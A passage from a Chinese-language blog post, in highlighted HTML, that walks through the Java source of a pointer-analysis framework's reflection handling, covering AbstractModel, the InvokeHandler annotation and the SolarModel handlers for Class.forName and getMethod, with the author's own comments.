class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUnresolvedCall</span><span class="params">(CSObj recv, Context context, Invoke invoke)</span> &#123;</span><br><span class="line">    annotationModel.onUnresolvedCall(recv, context, invoke);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="onNewCallEdge"><a href="#onNewCallEdge" class="headerlink" title="onNewCallEdge"></a>onNewCallEdge</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNewCallEdge</span><span class="params">(Edge&lt;CSCallSite, CSMethod&gt; edge)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (edge <span class="keyword">instanceof</span> ReflectiveCallEdge refEdge) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">callerCtx</span> <span class="operator">=</span> refEdge.getCallSite().getContext();</span><br><span class="line">        <span class="comment">// pass argument</span></span><br><span class="line">        <span class="type">Var</span> <span class="variable">args</span> <span class="operator">=</span> refEdge.getArgs();</span><br><span class="line">        <span class="keyword">if</span> (args != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">csArgs</span> <span class="operator">=</span> csManager.getCSVar(callerCtx, args);</span><br><span class="line">            passReflectiveArgs(refEdge, solver.getPointsToSetOf(csArgs));</span><br><span class="line">            <span class="comment">// record args for later-arrive array objects</span></span><br><span class="line">            reflectiveArgs.put(args, refEdge);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// pass return value</span></span><br><span class="line">        <span class="type">Invoke</span> <span class="variable">invoke</span> <span class="operator">=</span> refEdge.getCallSite().getCallSite();</span><br><span class="line">        <span class="type">Context</span> <span class="variable">calleeCtx</span> <span class="operator">=</span> refEdge.getCallee().getContext();</span><br><span class="line">        <span class="type">JMethod</span> <span class="variable">callee</span> <span class="operator">=</span> refEdge.getCallee().getMethod();</span><br><span class="line">        <span class="type">Var</span> <span class="variable">result</span> <span class="operator">=</span> invoke.getResult();</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span> &amp;&amp; isConcerned(callee.getReturnType())) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">csResult</span> <span class="operator">=</span> csManager.getCSVar(callerCtx, result);</span><br><span class="line">            callee.getIR().getReturnVars().forEach(ret -&gt; &#123;</span><br><span class="line">                <span class="type">CSVar</span> <span class="variable">csRet</span> <span class="operator">=</span> csManager.getCSVar(calleeCtx, ret);</span><br><span class="line">                solver.addPFGEdge(csRet, csResult, RETURN);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-Model-amp-AbstractModel"><a href="#4-2-Model-amp-AbstractModel" class="headerlink" title="4.2 Model &amp; AbstractModel"></a>4.2 Model &amp; AbstractModel</h2><p><code>Provides common functionalities for implementing API models.</code></p><p>个人理解是用于处理特殊API的接口。</p><h3 id="4-2-1-Field"><a href="#4-2-1-Field" class="headerlink" title="4.2.1 Field"></a>4.2.1 Field</h3><ul><li>isRelevantVar: 存的是&lt;Var, Invoke&gt;，用于判断是否处理过</li><li>relevantVarIndexes: 存的是Method和参数地址</li><li>handlers: 存的是待处理的InvokeHandler</li></ul><h4 id="isRelevantVar"><a href="#isRelevantVar" class="headerlink" title="isRelevantVar"></a>isRelevantVar</h4><p>判断是否是相关变量，逻辑是Model 接口存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存的是变量Var和Invoke调用</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> MultiMap&lt;Var, Invoke&gt; relevantVars = Maps.newMultiMap(Maps.newHybridMap());</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isRelevantVar</span><span class="params">(Var <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> relevantVars.containsKey(<span class="keyword">var</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="relevantVarIndexes"><a href="#relevantVarIndexes" class="headerlink" title="relevantVarIndexes"></a>relevantVarIndexes</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存的是method 和相关参数index</span></span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">final</span> Map&lt;JMethod, <span class="type">int</span>[]&gt; relevantVarIndexes = Maps.newHybridMap();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存method和index</span></span><br><span class="line">   <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">registerRelevantVarIndexes</span><span class="params">(JMethod api, <span class="type">int</span>... indexes)</span> &#123;</span><br><span class="line">       relevantVarIndexes.put(api, indexes);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>以ReflectiveActionModel为例，relevantVarIndexes存的是InvokeHandler<br><img src="/images/pasted-794.png" alt="upload successful"></p><h3 id="4-2-2-InvokeHandler注解"><a href="#4-2-2-InvokeHandler注解" class="headerlink" title="4.2.2 InvokeHandler注解"></a>4.2.2 InvokeHandler注解</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractModel</span> <span class="keyword">extends</span> <span class="title class_">SolverHolder</span> <span class="keyword">implements</span> <span class="title class_">Model</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Map&lt;JMethod, TriConsumer&lt;CSVar, PointsToSet, Invoke&gt;&gt; handlers</span><br><span class="line">            = Maps.newMap();</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">AbstractModel</span><span class="params">(Solver solver)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(solver);</span><br><span class="line">        registerVarAndHandlersByAnnotation();</span><br><span class="line">        registerVarAndHandlers();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">registerVarAndHandlersByAnnotation</span><span class="params">()</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = getClass();</span><br><span class="line">        <span class="keyword">for</span> (Method method : clazz.getMethods()) &#123;</span><br><span class="line">            InvokeHandler[] invokeHandlers = method.getAnnotationsByType(InvokeHandler.class);</span><br><span class="line">            <span class="keyword">if</span> (invokeHandlers != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (InvokeHandler invokeHandler : invokeHandlers) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> invokeHandler.signature();</span><br><span class="line">                    <span class="type">JMethod</span> <span class="variable">api</span> <span class="operator">=</span> hierarchy.getMethod(signature);</span><br><span class="line">                    <span class="keyword">if</span> (api != <span class="literal">null</span>) &#123;</span><br><span class="line">                        registerRelevantVarIndexes(api, invokeHandler.argIndexes());</span><br><span class="line">                        registerAPIHandler(api, createHandler(method));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">registerAPIHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">            JMethod api, TriConsumer&lt;CSVar, PointsToSet, Invoke&gt; handler)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (handlers.containsKey(api)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="built_in">this</span> + <span class="string">&quot; registers multiple handlers for &quot;</span> +</span><br><span class="line">                    api + <span class="string">&quot; (in a Model, at most one handler can be registered for a method)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        handlers.put(api, handler);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在初始化时，就会把带有InvokeHandler注解的方法，放在处理handlers中。</p><p>以SolarModel为例，当处理forName 方法时，就会调用Solar#classForName 方法进行处理。</p><p><img src="/images/pasted-725.png" alt="upload successful"></p><h3 id="4-2-3-其他API"><a href="#4-2-3-其他API" class="headerlink" title="4.2.3 其他API"></a>4.2.3 其他API</h3><h4 id="handleNewInvoke"><a href="#handleNewInvoke" class="headerlink" title="handleNewInvoke"></a>handleNewInvoke</h4><p>默认处理NewInvoke，再往上一层是ReflectionAnalysis#onNewStmt，结果是在relevantVars 里新增对应记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ReflectionAnalysis#onNewStmt</span><br><span class="line">AbstractModel#handleNewInvoke</span><br><span class="line">    relevantVars#put</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleNewInvoke</span><span class="params">(Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="type">JMethod</span> <span class="variable">target</span> <span class="operator">=</span> invoke.getMethodRef().resolveNullable();</span><br><span class="line">    <span class="keyword">if</span> (target != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">int</span>[] indexes = relevantVarIndexes.get(target);</span><br><span class="line">        <span class="keyword">if</span> (indexes != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i : indexes) &#123;</span><br><span class="line">                relevantVars.put(InvokeUtils.getVar(invoke, i), invoke);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="handleNewPointsToSet"><a href="#handleNewPointsToSet" class="headerlink" title="handleNewPointsToSet"></a>handleNewPointsToSet</h4><p>默认当处理CSVar指向新pts，调用对应handler处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ReflectionAnalysis#onNewPointsToSet</span><br><span class="line">AbstractModel#handleNewPointsToSet</span><br><span class="line">    handler#accept</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleNewPointsToSet</span><span class="params">(CSVar csVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    relevantVars.get(csVar.getVar()).forEach(invoke -&gt; &#123;</span><br><span class="line">        <span class="type">JMethod</span> <span class="variable">target</span> <span class="operator">=</span> invoke.getMethodRef().resolve();</span><br><span class="line">        <span class="type">var</span> <span class="variable">handler</span> <span class="operator">=</span> handlers.get(target);</span><br><span class="line">        <span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用handler 对应method处理</span></span><br><span class="line">            handler.accept(csVar, pts, invoke);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-3-SolarModel"><a href="#4-3-SolarModel" class="headerlink" title="4.3 SolarModel"></a>4.3 SolarModel</h2><p>最主要的两个Model</p><ul><li>SolarModel</li><li>ReflectiveActionModel<br>先看SolarModel</li></ul><h3 id="4-3-1-fields"><a href="#4-3-1-fields" class="headerlink" title="4.3.1 fields"></a>4.3.1 fields</h3><ul><li>typeMatcher：类型判断所用, todo<ul><li>typeSystem</li><li>typeInfos</li></ul></li><li>handlers：上文AbstractModel解释的通过InvokeHandler注解注册的各种API处理方法</li><li>solver: 原Solver</li><li>csManager</li><li>unsoundInvokes: 存的是暂时无法确定的invoke调用，会在每次invoke中尝试去解析</li></ul><h3 id="4-3-2-handlers"><a href="#4-3-2-handlers" class="headerlink" title="4.3.2 handlers"></a>4.3.2 handlers</h3><p>以Class.forName 为例</p><h4 id="Class-forName-java-lang-String"><a href="#Class-forName-java-lang-String" class="headerlink" title="Class.forName(java.lang.String)"></a>Class.forName(java.lang.String)</h4><p>总结：根据参数string是否是常量，如果是常量，那么转换成常量对应的类obj，如果不是常量，那么生成一个unknow的obj。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上文提到的InvokeHandler，遇到Class.forName 会调用当前method进行处理</span></span><br><span class="line">   <span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.Class: java.lang.Class forName(java.lang.String)&gt;&quot;, argIndexes = &#123;0&#125;)</span></span><br><span class="line">   <span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.Class: java.lang.Class forName(java.lang.String,boolean,java.lang.ClassLoader)&gt;&quot;, argIndexes = &#123;0&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">classForName</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (isIgnored(invoke)) &#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 获取上下文敏感变脸csVar 的上下文</span></span><br><span class="line">       <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">       pts.forEach(obj -&gt; &#123;</span><br><span class="line">       <span class="comment">// 如果obj 不是字符串常量</span></span><br><span class="line">           <span class="keyword">if</span> (!heapModel.isStringConstant(obj.getObject())) &#123; <span class="comment">// generate c^u</span></span><br><span class="line">           <span class="comment">// 那么医用solver添加一个指向，var为result，obj为新生成的unknow</span></span><br><span class="line">               <span class="type">Var</span> <span class="variable">result</span> <span class="operator">=</span> invoke.getResult();</span><br><span class="line">               <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="type">Obj</span> <span class="variable">unknownClass</span> <span class="operator">=</span> helper.getUnknownClass(invoke);</span><br><span class="line">                   solver.addVarPointsTo(context, result, unknownClass);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123; <span class="comment">// generate c^t</span></span><br><span class="line">               <span class="comment">// 如果是常量，那么根据string常量生成对应的obj</span></span><br><span class="line">               classForNameKnown(context, invoke, CSObjs.toString(obj));</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><blockquote><p>疑问：对于<code>Class.forName(java.lang.String)</code>这类invoke，普通指针分析如何的逻辑？<br>可以看看DefaultSolver#processCall 的逻辑。</p></blockquote><h4 id="getMethods-amp-getDeclaredMethods"><a href="#getMethods-amp-getDeclaredMethods" class="headerlink" title="getMethods() &amp; getDeclaredMethods()"></a>getMethods() &amp; getDeclaredMethods()</h4><p>思考：与上面的<code>Class.forName</code>类似，针对<code>r=o.getMethods()</code>，getMethods()要做的就是加上r var到o.getMethods 的所有可能method 对应的obj。</p><p>总结：因为返回是个Array，所以还需要考虑Array内部元素</p><ol><li>r 指向一个array，具体由helper.getMetaObjArray(invoke) 生成</li><li>array[i]指向o 里的每个method 对应生成的obj</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.Class: java.lang.reflect.Method[] getMethods()&gt;&quot;, argIndexes = &#123;BASE&#125;)</span></span><br><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.Class: java.lang.reflect.Method[] getDeclaredMethods()&gt;&quot;, argIndexes = &#123;BASE&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">classGetMethods</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isIgnored(invoke)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取invoke的result，也即r</span></span><br><span class="line">    <span class="type">Var</span> <span class="variable">result</span> <span class="operator">=</span> invoke.getResult();</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="type">CSObj</span> <span class="variable">methodArray</span> <span class="operator">=</span> csManager.getCSObj(context, helper.getMetaObjArray(invoke));</span><br><span class="line">        <span class="type">ArrayIndex</span> <span class="variable">methodArrayIndex</span> <span class="operator">=</span> csManager.getArrayIndex(methodArray);</span><br><span class="line">        pts.forEach(classObj -&gt; &#123;</span><br><span class="line">            Obj method;</span><br><span class="line">            <span class="keyword">if</span> (helper.isUnknownMetaObj(classObj)) &#123; <span class="comment">// generate m^u_u</span></span><br><span class="line">                method = helper.getUnknownMethod(invoke, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// generate m^t_u</span></span><br><span class="line">                <span class="type">JClass</span> <span class="variable">clazz</span> <span class="operator">=</span> CSObjs.toClass(classObj);</span><br><span class="line">                method = helper.getUnknownMethod(invoke, clazz, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 并不是Array里的每个index都是个Var，而是整个当作一个Var</span></span><br><span class="line">            solver.addPointsTo(methodArrayIndex, method);</span><br><span class="line">            <span class="comment">// 一开始以为：这里为什么要在for 里呢？为什么不放外面，虽然结果一样</span></span><br><span class="line">            solver.addVarPointsTo(context, result, methodArray);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><h4 id="Method-getMethod-amp-Method-getDeclaredMethod"><a href="#Method-getMethod-amp-Method-getDeclaredMethod" class="headerlink" title="Method.getMethod &amp; Method.getDeclaredMethod"></a>Method.getMethod &amp; Method.getDeclaredMethod</h4><p>针对<code>r=o.getMethod(a1,a2)</code></p><p>总结：增加以下的指向</p><ol><li>var r 指向由o.method生成的obj</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])&gt;&quot;, argIndexes = &#123;BASE, 0&#125;)</span></span><br><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])&gt;&quot;, argIndexes = &#123;BASE, 0&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">classGetMethod</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isIgnored(invoke)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Var</span> <span class="variable">result</span> <span class="operator">=</span> invoke.getResult();</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">        List&lt;PointsToSet&gt; args = getArgs(csVar, pts, invoke, BASE, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// o</span></span><br><span class="line">        <span class="type">PointsToSet</span> <span class="variable">classObjs</span> <span class="operator">=</span> args.get(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// a1</span></span><br><span class="line">        <span class="type">PointsToSet</span> <span class="variable">nameObjs</span> <span class="operator">=</span> args.get(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">        classObjs.forEach(classObj -&gt; &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isClassUnknown</span> <span class="operator">=</span> helper.isUnknownMetaObj(classObj);</span><br><span class="line">            <span class="type">JClass</span> <span class="variable">clazz</span> <span class="operator">=</span> CSObjs.toClass(classObj);</span><br><span class="line">            nameObjs.forEach(nameObj -&gt; &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isNameUnknown</span> <span class="operator">=</span> !heapModel.isStringConstant(</span><br><span class="line">                        nameObj.getObject());</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> CSObjs.toString(nameObj);</span><br><span class="line">                <span class="comment">// 如果有一个class 或者name 是未分析的</span></span><br><span class="line">                <span class="keyword">if</span> (isClassUnknown || isNameUnknown) &#123; <span class="comment">// generate m^t_u, m^u_s, and m^u_u</span></span><br><span class="line">                <span class="comment">// 那么当作一个unkonw method来处理</span></span><br><span class="line">                    <span class="type">Obj</span> <span class="variable">unknownMethod</span> <span class="operator">=</span> helper.getUnknownMethod(invoke, clazz, name);</span><br><span class="line">                    solver.addVarPointsTo(context, result, unknownMethod);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123; <span class="comment">// generate m^t_s</span></span><br><span class="line">                <span class="comment">// 重点逻辑：解析具体的method</span></span><br><span class="line">                    classGetMethodKnown(context, invoke, clazz, name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题是如何根据a1和a2确定o对应的method？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">classGetMethodKnown</span><span class="params">(Context context, Invoke invoke,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@Nullable</span> JClass clazz, <span class="meta">@Nullable</span> String name)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span> &amp;&amp; name != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">result</span> <span class="operator">=</span> invoke.getResult();</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取invoke 对应的所有的 methods</span></span><br><span class="line">            Stream&lt;JMethod&gt; methods = <span class="keyword">switch</span> (invoke.getMethodRef().getName()) &#123;</span><br><span class="line">            <span class="comment">// 如果class 都分析了，那么获取class 对应name的 method</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;getMethod&quot;</span> -&gt; Reflections.getMethods(clazz, name);</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;getDeclaredMethod&quot;</span> -&gt; Reflections.getDeclaredMethods(clazz, name);</span><br><span class="line">                <span class="keyword">default</span> -&gt; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnalysisException</span>(</span><br><span class="line">                        <span class="string">&quot;Expected [getMethod, getDeclaredMethod], given &quot;</span> +</span><br><span class="line">                                invoke.getMethodRef());</span><br><span class="line">            &#125;;</span><br><span class="line">            methods.map(helper::getMetaObj)</span><br><span class="line">                    .forEach(mtdObj -&gt; solver.addVarPointsTo(context, result, mtdObj));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>疑问，没分析a2吗？</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Obj <span class="title function_">getMetaObj</span><span class="params">(Object classOrTypeOrMember)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getMetaObj(classOrTypeOrMember, REFLECTION_DESC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Obj <span class="title function_">getMetaObj</span><span class="params">(Object classOrTypeOrMember, Descriptor desc)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (classOrTypeOrMember <span class="keyword">instanceof</span> JClass jclass) &#123;</span><br><span class="line">        <span class="type">ClassLiteral</span> <span class="variable">classLiteral</span> <span class="operator">=</span> ClassLiteral.get(jclass.getType());</span><br><span class="line">        <span class="keyword">return</span> desc.equals(REFLECTION_LOG_DESC)</span><br><span class="line">                ? heapModel.getMockObj(desc, classLiteral, clazz)</span><br><span class="line">                : heapModel.getConstantObj(classLiteral);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (classOrTypeOrMember <span class="keyword">instanceof</span> Type type) &#123;</span><br><span class="line">        <span class="type">ClassLiteral</span> <span class="variable">classLiteral</span> <span class="operator">=</span> ClassLiteral.get(type);</span><br><span class="line">        <span 